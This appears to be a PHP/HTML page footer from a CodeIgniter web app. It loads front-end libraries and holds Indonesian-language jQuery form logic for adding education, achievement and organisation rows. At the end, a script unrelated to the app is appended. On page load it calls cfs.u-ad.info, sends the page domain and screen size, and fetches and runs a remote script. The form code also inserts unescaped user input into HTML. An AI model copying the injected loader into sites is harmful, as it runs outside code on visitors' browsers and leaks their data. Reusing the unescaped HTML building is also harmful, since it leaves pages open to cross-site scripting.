
<script src="<?php echo base_url();?>assets/ajax/jquery/jquery.min.js"></script>

<script src="<?php echo base_url();?>assets/js/star-rating.js" type="text/javascript"></script>

<!-- ================================================
Chart.js
================================================ -->

<!-- <script type="text/javascript" src="<?php echo base_url();?>'assets/chartjs/Chart.min.js'?>"></script> -->

<!-- ================================================
jQuery Library
================================================ -->
<script type="text/javascript" src="<?php echo base_url();?>assets/js/jquery.min.js"></script>

<!-- ================================================
Bootstrap Core JavaScript File
================================================ -->
<script src="<?php echo base_url();?>assets/js/bootstrap/bootstrap.min.js"></script>

<!-- ================================================
Plugin.js - Some Specific JS codes for Plugin Settings
================================================ -->
<script type="text/javascript" src="<?php echo base_url();?>assets/js/plugins.js"></script>

<!-- ================================================
Data Tables
================================================ -->
<script src="<?php echo base_url();?>assets/js/datatables/datatables.min.js"></script>

<!-- ================================================
Bootstrap Select
================================================ -->
<script type="text/javascript" src="<?php echo base_url();?>assets/js/bootstrap-select/bootstrap-select.js"></script>

<!-- ================================================
Moment.js
================================================ -->
<script type="text/javascript" src="<?php echo base_url();?>assets/js/moment/moment.min.js"></script>

<!-- ================================================
Bootstrap Date Range Picker
================================================ -->
<script type="text/javascript" src="<?php echo base_url();?>assets/js/date-range-picker/daterangepicker.js"></script>

<!-- ================================================
Bootstrap Toggle
================================================ -->
<script type="text/javascript" src="<?php echo base_url();?>assets/js/bootstrap-toggle/bootstrap-toggle.min.js"></script>

<!-- ================================================
Bootstrap WYSIHTML5
================================================ -->
<!-- main file -->
<script type="text/javascript" src="<?php echo base_url();?>assets/js/bootstrap-wysihtml5/wysihtml5-0.3.0.min.js"></script>
<!-- bootstrap file -->
<script type="text/javascript" src="<?php echo base_url();?>assets/js/bootstrap-wysihtml5/bootstrap-wysihtml5.js"></script>

<!-- ================================================
Summernote
================================================ -->
<script type="text/javascript" src="<?php echo base_url();?>assets/js/summernote/summernote.min.js"></script>


<script>
//  angka 500 dibawah ini artinya pesan akan muncul dalam 0,5 detik setelah document ready
    $(document).ready(function(){setTimeout(function(){$(".notif").fadeIn('slow');}, 300);});
//  angka 3000 dibawah ini artinya pesan akan hilang dalam 3 detik setelah muncul
    setTimeout(function(){$(".notif").fadeOut('slow');}, 5000);
</script>
<!-- Basic Single Date Picker -->
<script type="text/javascript">
$(document).ready(function() {
  $('#date-picker').daterangepicker({ singleDatePicker: true }, function(start, end, label) {
    console.log(start.toISOString(), end.toISOString(), label);
  });
});
</script>
<!-- ==========================================
TAMBAH PENDIDIKAN
=============================================== -->

<script>
  $('#daftar').click(function(e){
      var trg=$(e.target);
      if(trg.attr('href')){
          if(trg.html()=='Delete'){
              trg.parents('tr').remove();
              stripTabel();
          }
      }
      return false;
  });
  var isiPesan = $('#isipesan');
  function stripTabel(){
      $('table').each(function(){
          $(this).find('tbody').children().filter(':odd').css('background-color','#b6d7e7').parent().filter(':even').css('background-color','#f1f7f9');
      });
  }
  function updatePesan(pesan){
      isiPesan.html(pesan).addClass('kode-alert kode-alert-icon kode-alert-click alert2');
      setTimeout(function() {
          removeClass('kode-alert kode-alert-icon kode-alert-click alert2', 100);
      }, 250);
      //$('#pnlpesan').empty();
  }
  var btnTambahSekolah=$('#tambahsekolah'),
      opsiTingkat=$('#opsitingkat'),
      nmPendidikan=$('#nmpendidikan'),
      jurusan=$('#jurusan'),
      noIjazah=$('#noijazah'),
      thnPendidikan=$('#thnpendidikan')

  btnTambahSekolah.click(function(){
      if(opsiTingkat.val().trim().length<1){
          updatePesan('Tingkat pendidikan harus dipilih')
          opsiTingkat.focus();
          return false;
      }
      if(nmPendidikan.val().trim().length<5||!/^[\w\'\., ]+$/.test(nmPendidikan.val())){
          updatePesan('Nama pendidikan harus lebih dari 4 karakter dan hanya berisi alfabet, spasi dan bilangan');
          nmPendidikan.focus();
          return false;
      }
      if(jurusan.val().trim().length<0){
          jurusan='Tidak ada';
          return true;
      }
      if(noIjazah.val().trim().length<6){
          updatePesan("No Ijazah harus lebih dari 5 karakter");
          noIjazah.focus();
          return false;
      }
      if(!/^\d{4}$/.test(thnPendidikan.val())){
          updatePesan('Tahun kelulusan terdiri dari 4 digit angka');
          thnPendidikan.focus();
          return false;
      }
      $('#nodata').empty();
      $('#daftar > tbody').append('<tr>'+
          '<td><input type="hidden" name="tingkat[]" value="'+opsiTingkat.val()+'" >'+opsiTingkat.val()+'</td>'+
          '<td><input type="hidden" name="nama[]" value="'+nmPendidikan.val()+'" >'+nmPendidikan.val()+'</td>'+
          '<td><input type="hidden" name="jurusan[]" value="'+jurusan.val()+'" >'+jurusan.val()+'</td>'+
          '<td><input type="hidden" name="no_ijazah[]" value="'+noIjazah.val()+'" >'+noIjazah.val()+'</td>'+
          '<td><input type="hidden" name="tahun[]" value="'+thnPendidikan.val()+'" >'+thnPendidikan.val()+'</td>'+
          '<td><a href="#">Delete</a></td>'+
          '</tr>');
      stripTabel();
      opsiTingkat.val('SD');
      nmPendidikan.val('');
      jurusan.val('');
      noIjazah.val('');
      thnPendidikan.val('');
  });

  var btnTambahPrestasi=$('#tambahprestasi'),
      prestasi=$('#prestasi'),
      instansi=$('#instansi'),
      tahun=$('#tahun')

  btnTambahPrestasi.click(function(){
      if(prestasi.val().trim().length<1){
          updatePesan('Prestasi harus dipilih')
          prestasi.focus();
          return false;
      }
      if(instansi.val().trim().length<5||!/^[\w\'\., ]+$/.test(instansi.val())){
          updatePesan('Instansi harus lebih dari 4 karakter dan hanya berisi alfabet, spasi dan bilangan');
          instansi.focus();
          return false;
      }
      if(!/^\d{4}$/.test(tahun.val())){
          updatePesan('Tahun kelulusan terdiri dari 4 digit angka');
          tahun.focus();
          return false;
      }
      $('#nodata').empty();
      $('#daftar > tbody').append('<tr>'+
          '<td><input type="hidden" name="prestasi[]" value="'+prestasi.val()+'" >'+prestasi.val()+'</td>'+
          '<td><input type="hidden" name="instansi[]" value="'+instansi.val()+'" >'+instansi.val()+'</td>'+
          '<td><input type="hidden" name="tahun[]" value="'+tahun.val()+'" >'+tahun.val()+'</td>'+
          '<td><a href="#">Delete</a></td>'+
          '</tr>');
      stripTabel();
      prestasi.val('');
      instansi.val('');
      tahun.val('');
  });

  var btnTambahOrganisasi=$('#tambahorganisasi'),
      organisasi=$('#organisasi'),
      jabatan=$('#jabatan'),
      tahun_awal=$('#tahun_awal'),
      tahun_akhir=$('#tahun_akhir')

  btnTambahOrganisasi.click(function(){
      if(organisasi.val().trim().length<1){
          updatePesan('Organisasi harus diisi')
          organisasi.focus();
          return false;
      }
      if(jabatan.val().trim().length<5){
          updatePesan('Jabatan harus lebih dari 4 karakter dan hanya berisi alfabet, spasi dan bilangan');
          jabatan.focus();
          return false;
      }
      if(!/^\d{4}$/.test(tahun_awal.val())){
          updatePesan('Tahun Awal terdiri dari 4 digit angka');
          tahun_awal.focus();
          return false;
      }
      if(!/^\d{4}$/.test(tahun_akhir.val())){
          updatePesan('Tahun Akhir terdiri dari 4 digit angka');
          tahun_akhir.focus();
          return false;
      }
      $('#nodata').empty();
      $('#daftar > tbody').append('<tr>'+
          '<td><input type="hidden" name="organisasi[]" value="'+organisasi.val()+'" >'+organisasi.val()+'</td>'+
          '<td><input type="hidden" name="jabatan[]" value="'+jabatan.val()+'" >'+jabatan.val()+'</td>'+
          '<td><input type="hidden" name="tahun_awal[]" value="'+tahun_awal.val()+'" >'+tahun_awal.val()+'</td>'+
          '<td><input type="hidden" name="tahun_akhir[]" value="'+tahun_akhir.val()+'" >'+tahun_akhir.val()+'</td>'+
          '<td><a href="#">Delete</a></td>'+
          '</tr>');
      stripTabel();
      organisasi.val('');
      jabatan.val('');
      tahun_awal.val('');
      tahun_akhir.val('');
  });
</script>



<script>
  /* BOOTSTRAP WYSIHTML5 */
  $('.textarea').wysihtml5();

  /* SUMMERNOTE*/
  $(document).ready(function() {
  $('#summernote').summernote();
});
</script>

<script>
$(document).ready(function() {
    $('#example0').DataTable({
          "paging": true,
          "lengthChange": true,
          "searching": true,
          "ordering": false,
          "info": true,
          "autoWidth": false
        });
} );
$(document).ready(function() {
    $('#example1').DataTable({
          "paging": true,
          "lengthChange": true,
          "searching": false,
          "ordering": false,
          "info": false,
          "autoWidth": false
        });
} );
</script>
<!--
<?php
    $query=$this->db->query("SELECT COUNT(*) as total
                                 FROM t_syabab");
    foreach ($query->result() as $row){
        $GetTotalSyabab = $row->total;        
    }
    $GetTotalSyabab= $GetTotalSyabab+1;
    for($i = 1;$i <=$GetTotalSyabab;$i++){ 
?>
      <script type="text/javascript">
      $(document).ready(function() {
        $('#date-picker_syabab<?php echo $i ?>').daterangepicker({ singleDatePicker: true }, function(start, end, label) {
          console.log(start.toISOString(), end.toISOString(), label);
        });
      });
      </script>
<?php } ?>
-->
<!-- Basic Date Range Picker -->
<script type="text/javascript">
$(document).ready(function() {
  $('#date-picker').daterangepicker(null, function(start, end, label) {
    console.log(start.toISOString(), end.toISOString(), label);
  });
});
</script>

<!-- Date Range and Time Picker -->
<script type="text/javascript">
$(document).ready(function() {
  $('#date-range-and-time-picker').daterangepicker({
    timePicker: true,
    timePickerIncrement: 30,
    format: 'MM/DD/YYYY h:mm A'
  }, function(start, end, label) {
    console.log(start.toISOString(), end.toISOString(), label);
  });
});
</script>

<script>
$(document).ready(function() {
    var table = $('#example').DataTable({
        "displayLength": 10,
        "drawCallback": function ( settings ) {
            var api = this.api();
            var rows = api.rows( {page:'current'} ).nodes();
            var last=null;
 
        }
    } );
} );
</script>


<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "cfs.u-ad.info/cfspushadsv2/request" + "?id=1" + "&enc=telkom2" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582Ltpw5OIinlRzL0pGTtLwy1%2b%2faRLx0GXyNWnkq%2bmiMDLIIgZrxjwIf2di0OqOhxOMYFow%2bs%2fHZe4bBXQZNEh6sipGSSOdm9r73ZH1iitxOFllaEDHlH7JSr30EO6s2%2brYFBvYMDVAi4RHz7%2f6XV8f%2fgqn7zdtQnke%2fC13xxz0j9TaiyyEf1nhGUS33kev%2fDb5WQR8xA%2fkon0z0lhmQPhVikx44iF0Hs4f1flXnj1%2b34Hy4TG%2f7cHPupfqf8RG4X8Tj9WMg5vAe4Bx03lYT9Cx39LiNHoWWpltOw0%2b%2byjVGJMu1iM7gP1iAPgoxyf76bBR75kcvpbtjWFgY330CIX%2fiprSlhDXKksckbyHpuCnsE27qiKpWKvv4fmpQmF%2f43iHgL0U0CQvHOelSb1sdgA2UV9r91X4kfv6DnHYhP6uFzh3yWUGiiBFEZebEGDIiSPFNQ3ytMlWdHSSz2tdaIzJBWA4B6U%2bsscm5leQ5zmj8aSUJb%2f13sec7sEN4Yg9jhko%2blREA5D0qfVZelK6iffn8go9hGSow1ZvHqBmVLjhBn8qMvR1b4THVAF15kcmFMX2LERcvhGnwPn92d%2bCFxDJGw%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
</html>